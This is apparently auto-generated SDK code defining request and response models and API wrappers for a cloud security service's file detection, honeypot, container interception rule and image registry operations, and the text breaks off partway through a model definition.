async function createCycleTask(request: CreateCycleTaskRequest): CreateCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return createCycleTaskWithOptions(request, runtime);
}

model CreateFileDetectRequest {
  hashKey?: string(name='HashKey', description='The identifier of the file. Only MD5 hash values are supported.', example='0a212417e65c26ff133cfff28f6c****'),
  ossKey?: string(name='OssKey', description='The key of the file that is stored in the Object Storage Service (OSS) bucket. You can call the [CreateFileDetectUploadUrl](~~CreateFileDetectUploadUrl~~) operation to query the keys of files.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='115.213.XX.XX'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown files
*   **1**: binary files
*   **2**: webshell files
*   **4**: script files

>  If you do not know the type of the file, set this parameter to 0.', example='0'),
}

model CreateFileDetectResponseBody = {
  hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model CreateFileDetectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectResponseBody(name='body'),
}

/**
  * You can call this operation to push a file to the cloud for detection. Before you call this operation, make sure that the file is uploaded. You can call the CreateFileDetectUploadUrl operation to upload the file.
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateFileDetectResponse
 */
async function createFileDetectWithOptions(request: CreateFileDetectRequest, runtime: Util.RuntimeOptions): CreateFileDetectResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKey)) {
    query['HashKey'] = request.hashKey;
  }
  if (!Util.isUnset(request.ossKey)) {
    query['OssKey'] = request.ossKey;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call this operation to push a file to the cloud for detection. Before you call this operation, make sure that the file is uploaded. You can call the CreateFileDetectUploadUrl operation to upload the file.
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectRequest
  * @return CreateFileDetectResponse
 */
async function createFileDetect(request: CreateFileDetectRequest): CreateFileDetectResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectWithOptions(request, runtime);
}

model CreateFileDetectUploadUrlRequest {
  hashKeyContextList?: [ 
    {
      fileSize?: int32(name='FileSize', description='The size of the file. Unit: bytes.', example='2698557'),
      hashKey?: string(name='HashKey', description='The hash value of the file.', example='30319dd5cee8f894766e479cac170da0'),
    }
  ](name='HashKeyContextList', description='The hash values of files.

>  You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.'),
  hashKeyList?: [ string ](name='HashKeyList', description='The identifier of the file. Only MD5 hash values are supported.

>  You must specify at least one of the **HashKeyList** and **HashKeyContextList** parameters.', example='CreateFileDetectUploadUrl'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown files
*   **1**: binary files
*   **2**: webshell files
*   **4**: script files

>  If you do not know the type of the file, set this parameter to **0**.', example='0'),
}

model CreateFileDetectUploadUrlResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  uploadUrlList?: [ 
    {
      code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
      context?: {
        accessId?: string(name='AccessId', description='The AccessKey ID that is used to access the OSS bucket.', example='LTAI4G1mgPbjvGQuiV1X****'),
        ossKey?: string(name='OssKey', description='The key of the file that is used after the file is uploaded to the OSS bucket.', example='1/2022/06/23/15/41/16559701077444693a0c6-33b2-4cc2-a99f-9f38b8b8****'),
        policy?: string(name='Policy', description='The policy that poses limits on file upload. For example, the policy limits the size of the file.', example='eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0yM1QxMDo****'),
        signature?: string(name='Signature', description='The signature that is used to upload the file.', example='wDhPgVdnY/bkKFYcYFl+4crl****'),
      }(name='Context', description='The signature information.'),
      expire?: string(name='Expire', description='The timestamp when the values of the parameters expire. Unit: milliseconds.', example='1658562101370'),
      fileExist?: boolean(name='FileExist', description='Indicates whether the file exists in the cloud. Valid values:

*   **true**: The file exists in the cloud. You do not need to upload the file.
*   **false**: The file does not exist in the cloud. You must upload the file.', example='false'),
      hashKey?: string(name='HashKey', description='The identifier of the file.', example='0a212417e65c26ff133cfff28f6c****'),
      internalUrl?: string(name='InternalUrl', description='The internal endpoint of the URL to which the file is uploaded.', example='http://example.com'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      publicUrl?: string(name='PublicUrl', description='The public endpoint of the URL to which the file is uploaded.', example='http://example.com'),
    }
  ](name='UploadUrlList', description='An array consisting of the parameters that are required to upload a file.'),
}

model CreateFileDetectUploadUrlResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateFileDetectUploadUrlResponseBody(name='body'),
}

/**
  * You can call the this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
  * The form upload method is provided by OSS. For more information, see [Form upload](https://www.alibabacloud.com/help/en/object-storage-service/latest/upload-objects-form-upload).
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectUploadUrlRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrlWithOptions(request: CreateFileDetectUploadUrlRequest, runtime: Util.RuntimeOptions): CreateFileDetectUploadUrlResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyContextList)) {
    query['HashKeyContextList'] = request.hashKeyContextList;
  }
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetectUploadUrl',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call the this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
  * The form upload method is provided by OSS. For more information, see [Form upload](https://www.alibabacloud.com/help/en/object-storage-service/latest/upload-objects-form-upload).
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectUploadUrlRequest
  * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrl(request: CreateFileDetectUploadUrlRequest): CreateFileDetectUploadUrlResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectUploadUrlWithOptions(request, runtime);
}

model CreateHoneypotRequest {
  honeypotImageId?: string(name='HoneypotImageId', description='The ID of the image that is used for the honeypot.

>  You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to obtain the IDs of images from the **HoneypotImageId** response parameter.', example='sha256:ebc4c102ac407d53733c2373e8888a733ddce86f163ccbe7492ae1cbf26****'),
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.

>  You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to obtain the names of images from the **HoneypotImageName** response parameter.', example='HoneyPotImageName'),
  honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
  meta?: string(name='Meta', description='The custom configuration of the honeypot in the JSON format. The value contains the following fields:

*   **trojan_git**: Git-specific Defense. Valid values:

    *   **zip**: Git Source Code Package
    *   **web**: Git Directory Leak
    *   **close**: Disabled

*   **trojan\\_git_addr**: Git Trojan Address.

*   **trojan_git.zip**: Git Trojan.

*   **burp**: Burp-specific Defense. Valid values:

    *   **open**: Enabled
    *   **close**: Disabled

*   **portrait_option**: Source Tracing Configuration. Valid values:

    *   **false**: Disable
    *   **true**: Enable', example='{\\"trojan_git\\":\\"close\\",\\"burp\\":\\"close\\",\\"portrait_option\\":\\"false\\"}'),
  nodeId?: string(name='NodeId', description='The ID of the management node to which you want to deploy the honeypot.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the IDs of management nodes.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
}

model CreateHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was is successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node to which the honeypot is deployed.', example='managerNodename'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image that is used for the honeypot.', example='HoneyDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='tcp_proxy'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='ddh3731641137fe4b72b245346a2721d4b6tdgg3731641137fe4b72b245346a2721***'),
    state?: [ string ](name='State', description='The status of the honeypot.'),
  }(name='Data', description='The information about the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='29874225-EAAC-5415-8501-32DD20FD29F6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotResponseBody(name='body'),
}

async function createHoneypotWithOptions(request: CreateHoneypotRequest, runtime: Util.RuntimeOptions): CreateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageId)) {
    query['HoneypotImageId'] = request.honeypotImageId;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypot(request: CreateHoneypotRequest): CreateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotWithOptions(request, runtime);
}

model CreateHoneypotNodeRequest {
  allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Specifies whether to allow the honeypots to access the Internet. Valid values:

*   **true**: allows the honeypots to access the Internet.
*   **false**: does not allow the honeypots to access the Internet.', example='true'),
  availableProbeNum?: int32(name='AvailableProbeNum', description='The number of probes that you want to allocate for the management node.', example='20'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='manageNode'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The CIDR blocks that are allowed to access the management node.'),
}

model CreateHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNode?: {
    nodeId?: string(name='NodeId'),
  }(name='HoneypotNode'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotNodeResponseBody(name='body'),
}

async function createHoneypotNodeWithOptions(request: CreateHoneypotNodeRequest, runtime: Util.RuntimeOptions): CreateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allowHoneypotAccessInternet)) {
    query['AllowHoneypotAccessInternet'] = request.allowHoneypotAccessInternet;
  }
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotNode(request: CreateHoneypotNodeRequest): CreateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotNodeWithOptions(request, runtime);
}

model CreateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='webmin'),
  meta?: string(name='Meta', description='The custom configurations of the honeypot template. The value is a JSON string that contains the following fields:

*   **portrait_option**: Social Source Tracing
*   **burp**: Burp-specific Defense
*   **trojan_git**: Git-specific Defense', example='{"burp":"close","trojan_git":"close","portrait_option":"true"}'),
  nodeId?: string(name='NodeId', description='The ID of the management node to which you want to deploy honeypots.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the IDs of management nodes.', example='9373fe59-74d5-4505-bb24-c85352fb****'),
  presetName?: string(name='PresetName', description='The custom name of the honeypot template.', example='WebMin-online'),
}

model CreateHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotPreset?: {
    honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='d6ece172-34d9-4942-99a4-b309cb55xxxx'),
  }(name='HoneypotPreset', description='The creation result.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7C1C6E65-C8B9-54C9-9F92-2F5E51C4E16D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotPresetResponseBody(name='body'),
}

async function createHoneypotPresetWithOptions(request: CreateHoneypotPresetRequest, runtime: Util.RuntimeOptions): CreateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotPreset(request: CreateHoneypotPresetRequest): CreateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotPresetWithOptions(request, runtime);
}

model CreateHoneypotProbeRequest {
  arp?: boolean(name='Arp', description='Specifies whether to enable Address Resolution Protocol (ARP) spoofing. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  businessGroupId?: string(name='BusinessGroupId', description='The ID of the business group.', example='2022011817324588686'),
  controlNodeId?: string(name='ControlNodeId', description='The ID of the management node.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  displayName?: string(name='DisplayName', description='The name of the probe.', example='testHoneyPotProbe'),
  honeypotBindList?: [ 
    {
      bindPortList?: [ 
        {
          bindPort?: boolean(name='BindPort', description='Specifies whether to bind a port. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
          endPort?: int32(name='EndPort', description='The end of the port range.', example='90'),
          fixed?: boolean(name='Fixed', description='Specifies whether the port is fixed. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
          startPort?: int32(name='StartPort', description='The start of the port range.', example='80'),
          targetPort?: int32(name='TargetPort', description='The destination port.

>  If **HoneypotId** is specified, this parameter is required.', example='80'),
        }
      ](name='BindPortList', description='The listener ports.'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='1a5eda2d40f92ac87d6b63e1a5ad4b76fe0d4110c4a3e2fa85438a29ae55****'),
    }
  ](name='HoneypotBindList', description='The honeypot configurations.'),
  ping?: boolean(name='Ping', description='Specifies whether to enable ping scan. Valid values:

*   **false**: yes
*   **false**: no', example='true'),
  probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe', example='host_probe'),
  probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='0.0.0'),
  proxyIp?: string(name='ProxyIp', description='The IP address of the proxy.', example='192.168.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the instance.

>  If **ProbeType** is set to **host_probe**, this parameter is required.', example='e4af3620-6895-4e2f-a641-a9d8fb53****'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.

>  If **ProbeType** is set to **vpc_black_hole_probe**, this parameter is required. You can call the DescribeVpcHoneyPotList operation to query the IDs of VPCs.', example='vpc-zm0asrkpv1q8gnk7mn4dn'),
}

model CreateHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotProbe?: {
    probeId?: string(name='ProbeId'),
  }(name='HoneypotProbe'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A839E8-70AE-591D-8D9E-C5419A2240DB'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotProbeResponseBody(name='body'),
}

async function createHoneypotProbeWithOptions(request: CreateHoneypotProbeRequest, runtime: Util.RuntimeOptions): CreateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.businessGroupId)) {
    query['BusinessGroupId'] = request.businessGroupId;
  }
  if (!Util.isUnset(request.controlNodeId)) {
    query['ControlNodeId'] = request.controlNodeId;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.honeypotBindList)) {
    query['HoneypotBindList'] = request.honeypotBindList;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  if (!Util.isUnset(request.probeVersion)) {
    query['ProbeVersion'] = request.probeVersion;
  }
  if (!Util.isUnset(request.proxyIp)) {
    query['ProxyIp'] = request.proxyIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotProbe(request: CreateHoneypotProbeRequest): CreateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotProbeWithOptions(request, runtime);
}

model CreateInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', example='c35xxxa416'),
  clusterName?: string(name='ClusterName', example='sas-test-cnnf'),
  dstTargetList?: map[string]any(name='DstTargetList'),
  interceptType?: long(name='InterceptType', example='1'),
  orderIndex?: long(name='OrderIndex', example='1'),
  ruleName?: string(name='RuleName', example='test-rule-1'),
  ruleSwitch?: int32(name='RuleSwitch', example='0'),
  ruleType?: string(name='RuleType', example='customize'),
  srcTarget?: map[string]any(name='SrcTarget'),
}

model CreateInterceptionRuleShrinkRequest {
  clusterId?: string(name='ClusterId', example='c35xxxa416'),
  clusterName?: string(name='ClusterName', example='sas-test-cnnf'),
  dstTargetListShrink?: string(name='DstTargetList'),
  interceptType?: long(name='InterceptType', example='1'),
  orderIndex?: long(name='OrderIndex', example='1'),
  ruleName?: string(name='RuleName', example='test-rule-1'),
  ruleSwitch?: int32(name='RuleSwitch', example='0'),
  ruleType?: string(name='RuleType', example='customize'),
  srcTargetShrink?: string(name='SrcTarget'),
}

model CreateInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', example='A01810A0-xxx5E2676'),
}

model CreateInterceptionRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateInterceptionRuleResponseBody(name='body'),
}

async function createInterceptionRuleWithOptions(tmpReq: CreateInterceptionRuleRequest, runtime: Util.RuntimeOptions): CreateInterceptionRuleResponse {
  Util.validateModel(tmpReq);
  var request = new CreateInterceptionRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstTargetList)) {
    request.dstTargetListShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstTargetList, 'DstTargetList', 'json');
  }
  if (!Util.isUnset(tmpReq.srcTarget)) {
    request.srcTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcTarget, 'SrcTarget', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.dstTargetListShrink)) {
    query['DstTargetList'] = request.dstTargetListShrink;
  }
  if (!Util.isUnset(request.interceptType)) {
    query['InterceptType'] = request.interceptType;
  }
  if (!Util.isUnset(request.orderIndex)) {
    query['OrderIndex'] = request.orderIndex;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.ruleSwitch)) {
    query['RuleSwitch'] = request.ruleSwitch;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  if (!Util.isUnset(request.srcTargetShrink)) {
    query['SrcTarget'] = request.srcTargetShrink;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createInterceptionRule(request: CreateInterceptionRuleRequest): CreateInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createInterceptionRuleWithOptions(request, runtime);
}

model CreateInterceptionTargetRequest {
  appName?: string(name='AppName', example='frontend'),
  clusterId?: string(name='ClusterId', example='cc20a1024011c44b6a8710d6f8b****'),
  clusterName?: string(name='ClusterName', example='sas-test-cnnf'),
  imageList?: [ string ](name='ImageList'),
  namespace?: string(name='Namespace', example='default'),
  tagList?: [ string ](name='TagList'),
  targetName?: string(name='TargetName'),
  targetType?: string(name='TargetType', example='IMAGE'),
}

model CreateInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', example='5B9ECCC0-38F7-***'),
  result?: boolean(name='Result', example='true'),
}

model CreateInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateInterceptionTargetResponseBody(name='body'),
}

async function createInterceptionTargetWithOptions(request: CreateInterceptionTargetRequest, runtime: Util.RuntimeOptions): CreateInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createInterceptionTarget(request: CreateInterceptionTargetRequest): CreateInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return createInterceptionTargetWithOptions(request, runtime);
}

model CreateJenkinsImageRegistryRequest {
  domainName?: string(name='DomainName', example='example.com'),
  extraParam?: string(name='ExtraParam', example='[{\\"namespace\\":\\"aa\\",\\"authToken\\":\\"aa\\"}]'),
  netType?: int32(name='NetType', example='1'),
  password?: string(name='Password', example='Harbor********'),
  persistenceDay?: int32(name='PersistenceDay', example='30'),
  protocolType?: int32(name='ProtocolType', example='1'),
  regionId?: string(name='RegionId', example='cn-shanghai'),
  registryHostIp?: string(name='RegistryHostIp', example='114.55.XXX.XXX'),
  registryName?: string(name='RegistryName', example='testRepo'),
  registryType?: string(name='RegistryType', example='CI/CD'),
  registryVersion?: string(name='RegistryVersion', example='V1'),
  sourceIp?: string(name='SourceIp', example='41.121.XXX.XXX'),
  transPerHour?: int32(name='TransPerHour', example='30'),
  userName?: string(name='UserName', example='RegistryUser'),
  vpcId?: string(name='VpcId', example='vpc-2ze4aoqgeu51ydfb8****'),
  whiteList?: string(name='WhiteList', example='192.168.XXX.XXX'),
}

model CreateJenkinsImageRegistryResponseBody = {
  data?: {
    blackList?: string(name='BlackList', example='61.9.XXX.XXX'),
    domainName?: string(name='DomainName', example='example.com'),
    gmtCreate?: string(name='GmtCreate', example='2022-10-16 18:17:16'),
    gmtModified?: string(name='GmtModified', example='2022-11-21 10:40:01'),
    id?: long(name='Id', example='443496'),
    netType?: int32(name='NetType', example='1'),
    password?: string(name='Password', example='Harbor******'),
